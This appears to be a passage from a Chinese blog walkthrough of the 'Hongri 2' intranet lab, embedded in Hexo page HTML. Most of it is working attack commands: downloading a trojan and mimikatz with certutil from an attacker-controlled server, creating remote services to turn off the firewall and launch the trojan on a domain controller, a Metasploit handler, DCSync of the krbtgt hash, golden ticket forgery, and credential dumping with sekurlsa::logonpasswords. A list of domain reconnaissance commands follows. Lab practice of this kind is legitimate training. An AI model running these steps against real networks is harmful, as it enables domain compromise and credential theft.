+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 4444</span><br></pre></td></tr></table></figure>
+
+<p>win7下载，使用Windows内置工具 <code>certutil</code> 来下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.183.132:4444/muma.exe C:\muma.exe</span><br></pre></td></tr></table></figure>
+
+<p>声明一个关闭防火墙的服务，取名为Firewall </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Firewall binpath= &quot;netsh advfirewall set allprofiles state off&quot; </span><br></pre></td></tr></table></figure>
+
+<p>运行服务，关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Firewall</span><br></pre></td></tr></table></figure>
+
+<p>木马上传到域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy muma.exe \\WIN-ENS2VR5TR3N\C$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306173239037.png" alt="image-20240306173239037"></p>
+<p>触发木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create shell binpath= &quot;c:\muma.exe&quot; sc \\WIN-ENS2VR5TR3N start shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306173254047.png" alt="image-20240306173254047"></p>
+<p>本地msf木马监听 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload windows/meterpreter/bind_tcp </span><br><span class="line">set lport 4455 </span><br><span class="line">set rhost 192.168.183.130 </span><br><span class="line">setg proxies socks5:127.0.0.1:1090</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306190351327.png" alt="image-20240306190351327"></p>
+<p>获得权限</p>
+<p>将进程注入到管理员权限而不是system进程中 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">dcsync_ntlm krbtgt </span><br></pre></td></tr></table></figure>
+
+<p>制作前建议把所有凭证清除kerberos_ticket_purge </p>
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306191007204.png" alt="image-20240306191007204"></p>
+<p>看看要设置哪些东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306191432815.png" alt="image-20240306191432815"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810-502 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t /root/golden.tck </span><br></pre></td></tr></table></figure>
+
+<p>-d 域全名 -u 伪造用户 -s 域SID -k “NTLM hash” -t  导出位置</p>
+<p>导入黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use  /root/golden.tck</span><br></pre></td></tr></table></figure>
+
+<p>票据验证(dir \WIN-ENS2VR5TR3N\c$)</p>
+<p>上传执行mimikatz</p>
+<p>过程与木马同样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.183.132:4444/mimikatz.exe C:\mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/49-%E5%86%85%E7%BD%912.assets/image-20240306194753725.png" alt="image-20240306194753725"></p>
+<p>获取用户名密码</p>
+<p>至此落幕</p>
+<p>知识知识</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   # 查看本机ip，所在域</span><br><span class="line">route print     # 打印路由信息</span><br><span class="line">net view        # 查看局域网内其他主机名</span><br><span class="line">arp -a          # 查看arp缓存</span><br><span class="line">net start       # 查看开启了哪些服务</span><br><span class="line">net share       # 查看开启了哪些共享</span><br><span class="line">net share ipc$  # 开启ipc共享</span><br><span class="line">net share c$    # 开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;    # 与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;    # 建立c盘共享</span><br><span class="line">dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</span><br><span class="line">net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators    # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net time /domain           // 主域服务器会同时作为时间服务器</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器（可能有多台）</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain    // 查看域管理员组</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/01/01/%E9%9D%B6%E6%9C%BA/48-%E5%86%85%E7%BD%91/49-%E7%BA%A2%E6%97%A5%E4%BA%8C/49-%E5%86%85%E7%BD%912-%E7%BA%A2%E6%97%A5%E4%BA%8C/" data-id="cltmognaz000b9wu4aobrawvi" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/01/01/%E9%9D%B6%E6%9C%BA/48-%E5%86%85%E7%BD%91/48-%E7%BA%A2%E6%97%A5%E4%B8%80/48-%E5%86%85%E7%BD%91-%E7%BA%A2%E6%97%A5%E4%B8%80/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          48.内网-红日一
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/12/29/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F-web%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">进入靶机并提权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Hexo</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2023 - 2024 John Doe<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  
+<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+
+  
+<script src="/plugin/galmenu/GalMenu.js"></script>
+
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
